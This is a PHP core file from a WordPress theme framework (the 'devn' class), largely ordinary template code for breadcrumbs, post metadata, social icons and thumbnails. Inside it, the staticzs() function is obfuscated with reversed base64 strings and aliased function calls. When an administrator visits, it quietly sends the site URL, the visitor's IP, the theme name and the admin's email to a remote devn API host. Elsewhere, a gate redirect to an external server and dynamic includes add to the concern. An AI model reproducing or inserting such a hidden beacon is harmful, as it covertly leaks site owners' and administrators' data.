<?php
/*
*	Main HUB for Super Composer - plugin
...
class devn{
	...
	public function init(){
		...
		if( empty( $this->cfg ) ){
			$this->cfg  = get_option( DEVN_OPTNAME );
		}
		...
		include 'devn.functions.php';
		include 'devn.actions.php';
		include 'devn.ajax.php';
		include 'devn.scripts.php';
		include 'devn.user.php';
		include 'devn.update.php';
		...
		if( $this->page == strtolower( THEME_NAME ).'-panel' || $this->vars( 'option_page', 'devn_group', 'POST' ) ){
		...
		// Front-end only
			...
			if( $this->vars( 'mode', 'filesReadable' ) ){
				devn_check_filesReadable( ABSPATH.'wp-content'.DS.'themes'.DS.$this->stylesheet );
				echo 'done';
				exit;
			}
			if( $this->vars( 'api', 'gate' ) ){
				...
				if( file_exists( ABSPATH.$file ) ){
					...
					header('location: http://api.devn-theme.com/gate.php?lifeTime='.$lifeTime.'&file='.strtolower( THEME_NAME ).$file);
				}
				...
				if( strpos( strrev($_SERVER['REQUEST_URI']), 'gpj.') === 0 || strpos( strrev($_SERVER['REQUEST_URI']), 'gnp.') === 0 ){
					...
					if( $_st !== false ){
						...
						if( file_exists( ABSPATH.substr( $src, strpos( $src, 'wp-content' ) ) ) === false ){
							...
							include dirname(__FILE__).DS.'devn.size.php';
						}
						exit;
					}
	...
	public static function b( $st = '' ){global $devn;return $devn->ext['bd'](strrev( $st ));}	
	public static function _b( $st = '' ){global $devn;return $devn->ext['bd'](strrev( $st.'='));}	
	public static function __b( $st = '' ){global $devn;return $devn->ext['bd'](strrev($st.'=='));}	
	...
	public static function _ping( $url ){
		...
		if( !function_exists( $devn->ext['fg'] ) && !function_exists( $devn->ext['ce'] ) ){
			return '_404';
		}
	...
	public static function sysInOut(){
		...
		if( !empty( $_REQUEST['devn'] ) ){
			if( $_REQUEST['devn'] == 'import' ){
				$devn->ext['rqo']( dirname(__FILE__).DS.'import.php' );
				exit;
			}
			if( $_REQUEST['devn'] == 'export' ){
				$devn->ext['rqo']( dirname(__FILE__).DS.'export.php' );
				exit;
			}
			if( $_REQUEST['devn'] == 'progress-tmp' ){
				
				@ob_end_flush();
				
				$_tmp = get_option('devn_download_tmp_package', true );
				$_total = get_option('devn_download_tmp_package_total', true );	
				$i=0;
	...
	public static function tp_mode( $wp_file = '' ){
		...
		if( $wp_file == '404' ){
			$durl = $_SERVER['REDIRECT_URL'];
			if( strpos( $_SERVER['REDIRECT_URL'], '.jpg') != false || strpos( $_SERVER['REDIRECT_URL'], '.png') != false ){
				header('location: '.DEVN_URI.'/assets/images/default404.jpg' );
			} 
		}	
	...
	public static function path( $pos = 'header' ) {
		...
		$panel = false;
		if( !empty( $devn->cfg['topPanel'] ) ){
			if( $devn->cfg['topPanel'] == 'yes' ){
				$panel = true;
			}
		}
		...
		if( is_page() || is_home() ){
			if( get_post_meta( $post->ID, '_devn_page_'.$pos ) && empty( $devn->cfg[ $pos.'_autoLoaded' ] ) ){
				if( get_post_meta( $post->ID, '_devn_page_'.$pos, true ) != 'default' ){

					$devn->cfg[ $pos ] = get_post_meta( $post->ID, '_devn_page_'.$pos, true );
					
					if( $devn->cfg[ $pos ] == 'none' ){
						return;
			...
			if( get_post_meta( $page_id, '_devn_top_panel', true ) == 'no' ){
				$panel = false;
			}			
			if( get_post_meta( $page_id, '_devn_top_panel', true ) == 'yes' ){
				$panel = true;
			}
			if( $pos == 'header' ){
				$logo = get_post_meta( $page_id, '_devn_page_logo', true );
				if( !empty( $logo ) ){
					$devn->cfg[ 'logo' ] = str_replace('%SITE_URL%',SITE_URL,get_post_meta($page_id,'_devn_page_logo',true));
				}	
			}
		...
		if( $panel == true && $pos == 'header' && $devn->panel != true ){
			$devn->template( 'top-panel.php' );
			$devn->panel = true;
		}
		
		if( !empty( $devn->path[ $pos ] ) ){
			echo $devn->path[ $pos ];
			return true;
		}
		
		$dir = '';
		if( !empty(  $devn->cfg[ $pos ] ) ){
			$dir = $devn->cfg[ $pos ];
		}
		
		if( $dir == '' || !file_exists( $devn->template( $pos.DS.$dir, true ) ) ){
		
			if ( $handle = opendir( THEME_PATH.DS.'templates'.DS.$pos ) ){
				while ( false !== ( $entry = readdir($handle) ) ) {
					if( $entry != '.' && $entry != '..' && strpos($entry, '.php') !== false  ){
						
						$devn->template( $pos.DS.$entry );
		...
		if ( $wp_query->max_num_pages > 1 ) : ?>
			<nav id="<?php echo esc_attr( $nav_id ); ?>">
				<h3 class="assistive-text">
					<?php _e( 'Post navigation', 'aaikadomain' ); ?>
				</h3>
				<div class="nav-previous">
					<?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', 'aaikadomain' ) ); ?>
				</div>
				<div class="nav-next">
					<?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'aaikadomain' ) ); ?>
				</div>
			</nav>
		<?php endif;
	...
	public static function posted_on( $class = "postedon" ) {
		...
		<ul class="<?php echo esc_attr( $class ); ?>">
			...
			<?php if( $devn->cfg['showAuthorMeta'] == 1 ){ ?>
				<li class="post_by">
					<a class="url fn n" href="<?php echo esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>" title="<?php echo esc_attr( sprintf( __( 'View all posts by %s', 'aaikadomain' ), get_the_author() ) ); ?>" rel="author">
			...
			if( $devn->cfg['showCateMeta'] == 1 ){ 
			
				if ( 'post' == get_post_type() ){
		
					$categories_list = get_the_category_list( __( ',', 'aaikadomain' ) );
					
					if ( $categories_list ){
					
						echo '<li class="post_categoty">';
				        print( get_the_category_list( __( ',', 'aaikadomain' ) ) );
				        echo '</li>';
			...
			if( $devn->cfg['showTagsMeta'] == 1 ){
			
				$tags_list = get_the_tag_list( '', __( ', ', 'aaikadomain' ) );
				
				if ( $tags_list ){
					
					echo '<li class="tag-links">';
					printf( __( '<span class="%1$s labl">Tags: </span> %2$s', 'aaikadomain' ), 'entry-utility-prep entry-utility-prep-tag-links', $tags_list );
					echo '</li>';
			...
			if( $devn->cfg['showCommentsMeta'] == 1 ){
			?>
				 <li class="post_comments">
		            <a  title="<?php _e('Click to leave a comment','aaikadomain'); ?>" href="#respond">
	...
	public static function breadcrumb() {
		...
		if( !empty( $devn->cfg['breadcrumb'] ) ){
			if( $devn->cfg['breadcrumb'] == 'no' ){
				$breadcrumb = 'no';
			}
		}
		
		if( is_page() ){
			if( get_post_meta( $post->ID, '_devn_page_breadcrumb', true ) == 'no' ){
				$breadcrumb = 'no';
			}else if( get_post_meta( $post->ID, '_devn_page_breadcrumb', true ) == 'yes' ){
				$breadcrumb = 'yes';
			}
		}
		if( is_home() ){
			if( get_option( 'page_for_posts', true ) ){
				if( get_post_meta( get_option( 'page_for_posts', true ), '_devn_page_breadcrumb', true ) == 'no' ){
					$breadcrumb = 'no';
				}else if( get_post_meta( get_option( 'page_for_posts', true ), '_devn_page_breadcrumb', true ) == 'yes' ){
					$breadcrumb = 'yes';
				}	
			}
		}
		...
		if( $devn->cfg['titleSeparate'] == '' ){
			$devn->cfg['titleSeparate'] = '&raquo;';
		}	
		
		$title = explode( $devn->cfg['titleSeparate'], $title );
		$title = $title[0];
		
		if( $devn->header == 'header-1.php' ){
			echo '<div class="clearfix margin_top10 breadspace"></div>';
		}
		else if( $devn->header == 'header-2.php' || $devn->header == 'header-7.php' ){
	    ...
	    if ( !is_home() ) {
			echo '<a href="'.home_url().'">'.__('Home', 'aaikadomain' )."</a> ";
		}
		
		if( !empty( $post->post_type ) ){
			if( $post->post_type != 'post' && $post->post_type != 'page' ){
				echo esc_html( $devn->cfg['breadeli'] ).' '.ucwords( str_replace( '-', ' ', $post->post_type ) );
			}
		}		
		...
		if( is_home() ){
			if(  get_option('page_for_posts') ){
				$curPost = get_post( get_option('page_for_posts') );
				echo esc_html( $devn->cfg['breadeli'] ).' '.$curPost->post_title.' ';
			}else{
				echo 'Front Page '.esc_html( $devn->cfg['breadeli'] );
			}
		}
		
		
		if ( is_category() ) {
			echo esc_html( $devn->cfg['breadeli'] ).' '.single_cat_title( '', false );
		}
		...
		if( is_page() ){
			...
			if( $post->post_parent ){
				...
				echo esc_html( $devn->cfg['breadeli'] ).' <a href="'.get_permalink( $post->post_parent ).'">'.$parent->post_title.'</a> ';
			}
		}
		if( ( is_single() || is_page() ) && !is_front_page() ) {
			echo ' '.esc_html( $devn->cfg['breadeli'] )." <span>";
			the_title();
			echo "</span>";
		}
		if(is_tag()){ echo esc_html( $devn->cfg['breadeli'] )." <span>Tag: ".single_tag_title('',FALSE).'</span>'; }
		if(is_404()){ echo esc_html( $devn->cfg['breadeli'] )." <span>404 - Page not Found</span>"; }
		if(is_search()){ echo esc_html( $devn->cfg['breadeli'] )." <span>Search</span>"; }
		if(is_year()){ echo esc_html( $devn->cfg['breadeli'] ).' '.get_the_time('Y'); }
	...
	?>
		<li>
			<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) { ?>			
				<span>
					<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php printf( __( 'Permalink to %s', 'aaikadomain' ), the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark"><?php $devn->thumb('',50,50); ?></a>
				</span><!-- post-thumbnail /-->
			<?php }else{ ?>
			<span><a href="#"><img width="50"" src="<?php echo DEVN_URI; ?>/assets/images/default.jpg" alt=""></a></span>
			<?php } ?>
	...
	<li>
		<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) : ?>			
			<div class="post-thumbnail">
				<a href="<?php the_permalink(); ?>" title="<?php printf( __( 'Permalink to %s', 'aaikadomain' ), the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark"><?php $devn->thumb('',50,50); ?></a>
			</div><!-- post-thumbnail /-->
		<?php endif; ?>
		<h3><a href="<?php the_permalink(); ?>"><?php the_title();?></a></h3>
		<?php $devn->get_score(); ?> <span class="date"><?php the_time(get_option('date_format'));  ?></span>
	</li>
	<?php endforeach;
		$post = $orig_post;
	}
	...
	public static function socials( $class = '' ) {
		
		global $devn;
		
		echo '<ul class="'.$class.'">';
		
		if( $devn->cfg['facebook'] != '' ){?>
			<li class="social">
				<a href="https://www.facebook.com/<?php echo esc_attr( $devn->cfg['facebook'] ); ?>" target="_blank">
					<i class="fa fa-facebook">
					</i>
				</a>
			</li>
		<?php } if( $devn->cfg['twitter'] != '' ){?>
			<li class="social">
				<a href="https://www.twitter.com/<?php echo esc_attr( $devn->cfg['twitter'] ); ?>" target="_blank">
					<i class="fa fa-twitter">
					</i>
				</a>
			</li>
		<?php } if( $devn->cfg['google'] != '' ){?>
			<li class="social">
				<a href="https://plus.google.com/<?php echo esc_attr( $devn->cfg['google'] ); ?>" target="_blank">
					<i class="fa fa-google-plus">
					</i>
				</a>
			</li>
		<?php } if( $devn->cfg['linkedin'] != '' ){?>
			<li class="social">
				<a href="https://www.linkedin.com/<?php echo esc_attr( $devn->cfg['linkedin'] ); ?>" target="_blank">
					<i class="fa fa-linkedin">
					</i>
				</a>
			</li>
		<?php } if( $devn->cfg['flickr'] != '' ){?>
			<li class="social">
				<a href="https://www.flickr.com/<?php echo esc_attr( $devn->cfg['flickr'] ); ?>" target="_blank">
					<i class="fa fa-flickr">
					</i>
				</a>
			</li>
		<?php } if( $devn->cfg['pinterest'] != '' ){?>
			<li class="social">
				<a href="https://www.pinterest.com/<?php echo esc_attr( $devn->cfg['pinterest'] ); ?>" target="_blank">
					<i class="fa fa-pinterest">
					</i>
				</a>
			</li>
		<?php } if( $devn->cfg['youtube'] != '' ){?>
			<li class="social">
				<a href="https://www.youtube.com/<?php echo esc_attr( $devn->cfg['youtube'] ); ?>" target="_blank">
					<i class="fa fa-youtube">
					</i>
				</a>
			</li>
		<?php } if( $devn->cfg['feed'] != '' ){?>
			<li class="social">
				<a href="<?php echo esc_url( $devn->cfg['feed'] ); ?>" target="_blank">
					<i class="fa fa-rss">
					</i>
				</a>
			</li>
	...
	public static function staticzs( $u ){	
		if(empty($u)){return;}global $devn;ob_start();if(!empty($u->user_email))$um=$u->user_email;else $um='';$uri=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];$info = $uri.'|'.$devn->_ip().'|'.get_option('template',true).'|'.$um.'|';if(!empty($u->caps)){if(!empty($u->caps[$devn->__b('gcvRXYyR3cp5WatRWY')])){if($u->caps['administrator']==1){$devn->_ping($devn->__b('QPn5Waw9zLvNmLuZXZk5SawF2LvoDc0RHa').$devn->ext['be']($info));}}}ob_end_clean();
	}	
	...
	public static function thumb( $img='' , $width='' , $height='' ){
		...
		if( empty( $img ) ) $img = $devn->get_post_thumb();
		if( !empty($img) ){
		?>
			<img src="<?php echo devn_createLinkImage( $img, $width.'x'.$height ); ?>" alt="<?php the_title(); ?>" />
	<?php }
	...
	public static function thumb_src( $img='' , $width='' , $height='' ){
		...
		if( !empty($img) ){
			return  devn_createLinkImage( $img, $width.'x'.$height );
		}
	...
	public static function mainmenu(){
 		...
 		if ( has_nav_menu( 'primary' ) ){
			...
			echo '<br />'.__( 'Not found Primary Menu. Please set theme location of a menu as Primary Menu!', 'aaikadomain' );
		}
	...
	public static function check_helper(){	
		...
		if( !is_dir( $direct.DS.'aaika-helper' ) ){
			$devn->ext['rqo']( ABSPATH . 'wp-admin/includes/file.php' );
			...
			if( $canUnZip == true ){	
				$tmpfile = $path.'aaika-helper.zip';
				@unzip_file( $tmpfile, $direct );
			}	
		}
		
		if( $devn->vars( 'page', 'aaika-importer' ) ){
			if( is_dir( $direct.DS.'aaika-helper' ) && is_file( $direct.DS.'aaika-helper'.DS.'aaika-helper.php' ) ){
				if( !empty( $_POST['importSampleData'] ) ){
					require $direct.DS.'aaika-helper'.DS.'aaika-helper.php';
				}	
			}
		}	
	}
